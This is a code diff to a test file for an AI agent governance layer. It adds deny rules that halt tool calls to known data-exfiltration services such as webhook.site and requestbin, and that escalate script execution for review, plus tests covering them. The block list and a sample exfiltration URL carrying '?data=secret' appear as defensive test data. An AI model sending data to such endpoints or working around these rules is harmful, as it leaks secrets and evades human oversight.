@@ -719,6 +719,21 @@ const COMMS_INVARIANT_DEFS_WITH_RULES = [
     type: "regex_deny",
     description: "Block launching external applications or mailto links through exec",
   },
+  {
+    id: "INV_NO_EXFIL_VIA_FETCH",
+    rule: "regex_deny pattern: /\\b(webhook\\.site|requestbin|pipedream\\.net|hookbin|burpcollaborator|interact\\.sh|canarytokens|ngrok\\.io|localtunnel)\\b/i",
+    enforcement: "halt",
+    type: "regex_deny",
+    description: "Block web_fetch requests to known data exfiltration endpoints",
+    applies_to: ["exec", "bash", "web_fetch", "web_search"],
+  },
+  {
+    id: "INV_ESCALATE_SCRIPT_EXEC",
+    rule: "regex_deny pattern: /\\b(python[23]?|node|ruby|perl|bash|sh|zsh)\\s+\\S+\\.(py|js|rb|pl|sh|zsh)\\b/i",
+    enforcement: "warn",
+    type: "regex_deny",
+    description: "Escalate execution of script files through exec for review",
+  },
 ];
 
 // Core returns UNKNOWN_TYPE for regex_deny rules it can't evaluate
@@ -873,7 +888,7 @@ describe("invariant escalation bypass prevention", () => {
       { toolName: "write" }
     );
 
-    // Write tool: regex fallback does NOT run (only exec/bash)
+    // Write tool: regex fallback does NOT run (only exec/bash/web_fetch/web_search)
     // UNKNOWN_TYPE checks are ignored by verdict override
     expect(result).toEqual({ blocked: false });
   });
@@ -963,6 +978,121 @@ describe("invariant escalation bypass prevention", () => {
     const hook = api._hooks.get("before_tool_call")!;
     const result = await hook(
       { toolName: "exec", params: { command: "open ./readme.txt" } },
+      { toolName: "exec" }
+    );
+
+    expect(result).toEqual({ blocked: false });
+  });
+
+  it("web_fetch to webhook.site is HALTED", async () => {
+    const api = createMockApi();
+    registerHooks(api, ENFORCE_CONFIG, createDeps());
+
+    mockEvaluateAuthority.mockReturnValue({
+      decision: "allow",
+      reason: "Permitted",
+      boundary_type: "can_execute",
+    });
+
+    mockLoadInvariantChecks.mockReturnValue(COMMS_INVARIANT_DEFS_WITH_RULES);
+    mockRunAllInvariantChecks.mockReturnValue(unknownTypeResults());
+
+    const hook = api._hooks.get("before_tool_call")!;
+    const result = (await hook(
+      { toolName: "web_fetch", params: { url: "https://webhook.site/abc123?data=secret" } },
+      { toolName: "web_fetch" }
+    )) as Record<string, unknown>;
+
+    expect(result.block).toBe(true);
+    expect(result.blockReason).toContain("Block web_fetch requests to known data exfiltration");
+  });
+
+  it("web_fetch to normal URL is ALLOW", async () => {
+    const api = createMockApi();
+    registerHooks(api, ENFORCE_CONFIG, createDeps());
+
+    mockEvaluateAuthority.mockReturnValue({
+      decision: "allow",
+      reason: "Permitted",
+      boundary_type: "can_execute",
+    });
+
+    mockLoadInvariantChecks.mockReturnValue(COMMS_INVARIANT_DEFS_WITH_RULES);
+    mockRunAllInvariantChecks.mockReturnValue(unknownTypeResults());
+
+    const hook = api._hooks.get("before_tool_call")!;
+    const result = await hook(
+      { toolName: "web_fetch", params: { url: "https://docs.python.org/3/" } },
+      { toolName: "web_fetch" }
+    );
+
+    expect(result).toEqual({ blocked: false });
+  });
+
+  it("exec running python3 script.py is ESCALATED", async () => {
+    const api = createMockApi();
+    registerHooks(api, ENFORCE_CONFIG, createDeps());
+
+    mockEvaluateAuthority.mockReturnValue({
+      decision: "allow",
+      reason: "Permitted",
+      boundary_type: "can_execute",
+    });
+
+    mockLoadInvariantChecks.mockReturnValue(COMMS_INVARIANT_DEFS_WITH_RULES);
+    mockRunAllInvariantChecks.mockReturnValue(unknownTypeResults());
+
+    const hook = api._hooks.get("before_tool_call")!;
+    const result = (await hook(
+      { toolName: "exec", params: { command: "python3 /tmp/send_email.py" } },
+      { toolName: "exec" }
+    )) as Record<string, unknown>;
+
+    expect(result.block).toBe(true);
+    expect(result.blockReason).toContain("Sanna requires approval");
+    expect(result.blockReason).toContain("INV_ESCALATE_SCRIPT_EXEC");
+  });
+
+  it("exec running python3 -c inline is still HALTED by existing invariants", async () => {
+    const api = createMockApi();
+    registerHooks(api, ENFORCE_CONFIG, createDeps());
+
+    mockEvaluateAuthority.mockReturnValue({
+      decision: "allow",
+      reason: "Permitted",
+      boundary_type: "can_execute",
+    });
+
+    mockLoadInvariantChecks.mockReturnValue(COMMS_INVARIANT_DEFS_WITH_RULES);
+    mockRunAllInvariantChecks.mockReturnValue(unknownTypeResults());
+
+    const hook = api._hooks.get("before_tool_call")!;
+    const result = (await hook(
+      { toolName: "exec", params: { command: "python3 -c 'import smtplib'" } },
+      { toolName: "exec" }
+    )) as Record<string, unknown>;
+
+    expect(result.block).toBe(true);
+    // Halt takes priority over escalate — smtplib hits INV_NO_HTTP_REQUESTS_VIA_EXEC
+    expect(result.blockReason).toContain("Blocked by Sanna governance");
+  });
+
+  it("exec running bare python3 is ALLOW", async () => {
+    const api = createMockApi();
+    registerHooks(api, ENFORCE_CONFIG, createDeps());
+
+    mockEvaluateAuthority.mockReturnValue({
+      decision: "allow",
+      reason: "Permitted",
+      boundary_type: "can_execute",
+    });
+
+    mockLoadInvariantChecks.mockReturnValue(COMMS_INVARIANT_DEFS_WITH_RULES);
+    mockRunAllInvariantChecks.mockReturnValue(unknownTypeResults());
+
+    const hook = api._hooks.get("before_tool_call")!;
+    const result = await hook(
+      { toolName: "exec", params: { command: "python3 --version" } },
       { toolName: "exec" }
     );
 
